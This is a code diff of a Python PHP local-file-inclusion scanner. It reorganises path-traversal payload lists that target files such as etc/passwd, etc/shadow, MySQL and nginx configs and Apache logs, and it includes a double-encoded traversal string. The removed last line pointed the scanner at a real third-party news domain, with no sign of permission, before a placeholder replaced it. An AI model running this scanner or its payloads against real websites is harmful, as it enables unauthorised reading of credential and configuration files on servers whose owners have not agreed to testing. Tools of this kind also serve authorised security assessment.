@@ -43,20 +43,8 @@ PREFIX_DIC_TRAV = [""
                    ]
 
 BASIC_DIC = ["etc/passwd"
-             , "etc/passwd%00"
-             , "apache2/logs/access.log"
-             , "apache2/logs/error.log"
-             , "apache/logs/access.log"
-             , "apache/logs/error.log"
-             , "bin/php.ini"
              , "etc/group"
              , "etc/hosts"
-             , "etc/motd"
-             , "etc/my.cnf"
-             , "etc/mysql/my.cnf"
-             , "etc/nginx/nginx.conf"
-             , "etc/php.ini"
-             , "etc/shadow"
              , "var/log/apache2/access.log"
              , "var/log/access.log"
              , "var/log/access_log"
@@ -66,7 +54,17 @@ BASIC_DIC = ["etc/passwd"
 
 
 ADV_DIC = ["etc/passwd"
-             , "etc/passwd%00"
+             , "etc/motd"
+             , "etc/my.cnf"
+             , "etc/mysql/my.cnf"
+             , "etc/nginx/nginx.conf"
+             , "etc/php.ini"
+             , "etc/shadow"
+             , "apache2/logs/access.log"
+             , "apache2/logs/error.log"
+             , "apache/logs/access.log"
+             , "apache/logs/error.log"
+             , "bin/php.ini"
              , "%252e%252e%252f"
              , "apache2/logs/access.log"
              , "apache2/logs/error.log"
@@ -455,6 +453,7 @@ class PHPLFIScanner:
 
         for link in LLinks:
             print(f"[*] Checking {link}")
+            
             for candidate in get_lfi_candidates(link):              
                 if candidate.param != None:
                     print(f'[+] Candidate.link: {candidate.link}')
@@ -491,7 +490,7 @@ class PHPLFIScanner:
                                             RESULT_LIST.append([len(response.content.decode('utf-8', errors='ignore')), candidate.link, lfi_test_url, next_param, att_param])
                                             RESULT_LIST_LENGTH.append(len(response.content.decode('utf-8', errors='ignore')))
                                         else:
-                                            print(f'[-] LFI not exploitable in: {lfi_test_url }. Response status code: {response.status_code}')
+                                            print(f'[-] Response status code: {response.status_code} LFI not exploitable in: {lfi_test_url }.')
 
 
                     for item in RESULT_LIST_LENGTH:
@@ -514,4 +513,4 @@ class PHPLFIScanner:
 
 
 if __name__ == "__main__":
-    PHPLFIScanner().scan("http://nvgazeta.ru")
+    PHPLFIScanner().scan("https://ip")
